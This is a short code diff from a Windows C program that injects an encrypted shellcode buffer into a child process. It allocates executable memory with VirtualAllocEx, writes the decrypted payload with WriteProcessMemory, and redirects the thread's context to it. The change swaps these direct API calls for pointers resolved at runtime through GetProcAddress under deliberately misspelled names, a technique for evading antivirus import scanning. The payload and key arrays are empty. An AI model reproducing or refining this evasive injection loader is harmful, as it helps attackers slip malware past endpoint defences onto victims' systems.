@@ -38,11 +38,19 @@ int main() {
 
     GetThreadContext(pi.hThread, &ctx);
 unsigned char itsthecod345[] = {};
-    LPVOID memlo = VirtualAllocEx(pi.hProcess, NULL, sizeof(itsthecod345),MEM_COMMIT | MEM_RESERVE, PAGE_EXECUTE_READWRITE);
+    
+    HMODULE hKernel32 = LoadLibraryA("kernel32.dll");
+LPVOID (*pVirtualAllnocEkx)(HANDLE, LPVOID, SIZE_T, DWORD, DWORD) =
+    (LPVOID(*)(HANDLE, LPVOID, SIZE_T, DWORD, DWORD))GetProcAddress(hKernel32, "VirtualAllocEx");
+    LPVOID memlo = pVirtualAllnocEkx(pi.hProcess, NULL, sizeof(itsthecod345),MEM_COMMIT | MEM_RESERVE, PAGE_EXECUTE_READWRITE);
+    
     unsigned char ke185hams[] = {}; 
     encaeshello((char*)  itsthecod345, sizeof(itsthecod345), ke185hams, sizeof(ke185hams));
+    
+    BOOL (*pWriteProcessM)(HANDLE, LPVOID, LPCVOID, SIZE_T, SIZE_T*) =
+    (BOOL(*)(HANDLE, LPVOID, LPCVOID, SIZE_T, SIZE_T*))GetProcAddress(hKernel32, "WriteProcessMemory");
 
-    WriteProcessMemory(pi.hProcess, memlo, itsthecod345, sizeof(itsthecod345), NULL);
+    pWriteProcessM(pi.hProcess, memlo, itsthecod345, sizeof(itsthecod345), NULL);
     ctx.Rcx = (DWORD64)memlo; 
     SetThreadContext(pi.hThread, &ctx);
 
